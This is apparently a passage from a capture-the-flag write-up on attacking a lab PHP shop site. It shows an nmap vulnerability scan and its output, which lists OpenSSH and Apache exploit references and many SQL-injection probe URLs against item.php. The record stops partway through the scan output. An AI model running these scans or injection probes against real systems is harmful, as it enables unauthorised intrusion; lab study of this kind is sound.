			<description>&lt;p&gt;Our target is 10.10.105.134.&lt;/p&gt;&lt;p&gt;This is a &lt;em&gt;very&lt;/em&gt; simple site: An index page (&lt;code&gt;index.php&lt;/code&gt;) that leads to a &lt;code&gt;shop.php&lt;/code&gt; page, which in turn links to three calls of &lt;code&gt;item.php?id=X&lt;/code&gt; (where &lt;code&gt;X&lt;/code&gt; is a number).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Trying to include &lt;code&gt;/etc/os-release&lt;/code&gt; via &lt;code&gt;item.php&lt;/code&gt; causes the site to display a Dennis Nedry page that taunts you to use SQLMap. Trying a hand-crafted test SQL injection also displays this page.&lt;/li&gt;&lt;li&gt;Trying different random indexes mostly doesn't work, though &lt;code&gt;item.php?id=100&lt;/code&gt; displays a curiously broken page.&lt;/li&gt;&lt;li&gt;Trying &lt;code&gt;item.php?id=..&lt;/code&gt; throws an SQL error revealing that the site is running on MySQL.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Let's see if our usual nmap scan turns up anything interesting:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA jurassic-park -Pn -A -T4 -sS &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-script&lt;/span&gt; vuln -p- 10.10.105.134&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives the following output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Wed Feb  2 20:28:37 2022 as: nmap -v -oA jurassic-park -Pn -A -T4 -sS -script vuln -p- 10.10.105.134
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.105.134
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070  7.8 https://vulners.com/packetstorm/PACKETSTORM:140070  *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8 https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
|       EDB-ID:40888    7.8 https://vulners.com/exploitdb/EDB-ID:40888  *EXPLOIT*
|       CVE-2016-8858   7.8 https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8 https://vulners.com/cve/CVE-2016-6515
|       1337DAY-ID-26494    7.8 https://vulners.com/zdt/1337DAY-ID-26494    *EXPLOIT*
|       SSV:92579   7.5 https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2016-10009  7.5 https://vulners.com/cve/CVE-2016-10009
|       1337DAY-ID-26576    7.5 https://vulners.com/zdt/1337DAY-ID-26576    *EXPLOIT*
|       SSV:92582   7.2 https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2016-10012  7.2 https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2 https://vulners.com/cve/CVE-2015-8325
|       SSV:92580   6.9 https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2016-10010  6.9 https://vulners.com/cve/CVE-2016-10010
|       1337DAY-ID-26577    6.9 https://vulners.com/zdt/1337DAY-ID-26577    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-25017/    5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/ *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8 https://vulners.com/exploitdb/EDB-ID:46516  *EXPLOIT*
|       EDB-ID:46193    5.8 https://vulners.com/exploitdb/EDB-ID:46193  *EXPLOIT*
|       CVE-2019-6111   5.8 https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328    5.8 https://vulners.com/zdt/1337DAY-ID-32328    *EXPLOIT*
|       1337DAY-ID-32009    5.8 https://vulners.com/zdt/1337DAY-ID-32009    *EXPLOIT*
|       SSV:91041   5.5 https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019  5.5 https://vulners.com/packetstorm/PACKETSTORM:140019  *EXPLOIT*
|       PACKETSTORM:136234  5.5 https://vulners.com/packetstorm/PACKETSTORM:136234  *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5 https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5 https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5 https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
|       EDB-ID:40858    5.5 https://vulners.com/exploitdb/EDB-ID:40858  *EXPLOIT*
|       EDB-ID:40119    5.5 https://vulners.com/exploitdb/EDB-ID:40119  *EXPLOIT*
|       EDB-ID:39569    5.5 https://vulners.com/exploitdb/EDB-ID:39569  *EXPLOIT*
|       CVE-2016-3115   5.5 https://vulners.com/cve/CVE-2016-3115
|       SSH_ENUM    5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT*
|       PACKETSTORM:150621  5.0 https://vulners.com/packetstorm/PACKETSTORM:150621  *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS  *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0 https://vulners.com/exploitdb/EDB-ID:45939  *EXPLOIT*
|       EDB-ID:45233    5.0 https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       CVE-2018-15919  5.0 https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0 https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0 https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0 https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730    5.0 https://vulners.com/zdt/1337DAY-ID-31730    *EXPLOIT*
|       CVE-2021-41617  4.4 https://vulners.com/cve/CVE-2021-41617
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3 https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3 https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
|       EDB-ID:40136    4.3 https://vulners.com/exploitdb/EDB-ID:40136  *EXPLOIT*
|       EDB-ID:40113    4.3 https://vulners.com/exploitdb/EDB-ID:40113  *EXPLOIT*
|       CVE-2020-14145  4.3 https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-6210   4.3 https://vulners.com/cve/CVE-2016-6210
|       1337DAY-ID-25440    4.3 https://vulners.com/zdt/1337DAY-ID-25440    *EXPLOIT*
|       1337DAY-ID-25438    4.3 https://vulners.com/zdt/1337DAY-ID-25438    *EXPLOIT*
|       CVE-2019-6110   4.0 https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0 https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6 https://vulners.com/cve/CVE-2018-20685
|       SSV:92581   2.1 https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2016-10011  2.1 https://vulners.com/cve/CVE-2016-10011
|       SRC-2016-0002   0.0 https://vulners.com/srcincite/SRC-2016-0002 *EXPLOIT*
|       PACKETSTORM:151227  0.0 https://vulners.com/packetstorm/PACKETSTORM:151227  *EXPLOIT*
|       PACKETSTORM:140261  0.0 https://vulners.com/packetstorm/PACKETSTORM:140261  *EXPLOIT*
|       PACKETSTORM:138006  0.0 https://vulners.com/packetstorm/PACKETSTORM:138006  *EXPLOIT*
|       PACKETSTORM:137942  0.0 https://vulners.com/packetstorm/PACKETSTORM:137942  *EXPLOIT*
|_      1337DAY-ID-30937    0.0 https://vulners.com/zdt/1337DAY-ID-30937    *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&amp;#39;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Couldn&amp;#39;t find a file-type field.
|   
|_    Couldn&amp;#39;t find a file-type field.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.10.105.134:80/item.php?id=1%27%20OR%20sqlspider
|     http://10.10.105.134:80/item.php?id=2%27%20OR%20sqlspider
|     http://10.10.105.134:80/item.php?id=3%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2021-44790  7.5 https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5 https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5 https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5 https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5 https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5 https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5 https://vulners.com/cve/CVE-2017-3167
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/  7.2 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/   *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2 https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2 https://vulners.com/exploitdb/EDB-ID:46676  *EXPLOIT*
|       CVE-2019-0211   7.2 https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502    7.2 https://vulners.com/zdt/1337DAY-ID-32502    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/  *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/ *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8 https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8 https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8 https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8 https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       CVE-2021-44224  6.4 https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4 https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4 https://vulners.com/cve/CVE-2017-9788
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/  6.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/   *EXPLOIT*
|       CVE-2019-0217   6.0 https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8 https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8 https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577    5.8 https://vulners.com/zdt/1337DAY-ID-33577    *EXPLOIT*
|       CVE-2016-5387   5.1 https://vulners.com/cve/CVE-2016-5387
|       SSV:96537   5.0 https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/   5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/ 5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/  5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/    5.0 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/ *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED   *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0 https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
|       EDB-ID:42745    5.0 https://vulners.com/exploitdb/EDB-ID:42745  *EXPLOIT*
|       EDB-ID:40909    5.0 https://vulners.com/exploitdb/EDB-ID:40909  *EXPLOIT*
|       CVE-2021-34798  5.0 https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0 https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0 https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0 https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0 https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0 https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0 https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0 https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0 https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0 https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0 https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0 https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0 https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0 https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0 https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0 https://vulners.com/cve/CVE-2016-4979
|       1337DAY-ID-28573    5.0 https://vulners.com/zdt/1337DAY-ID-28573    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/   4.9 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/    *EXPLOIT*
|       CVE-2019-0197   4.9 https://vulners.com/cve/CVE-2019-0197
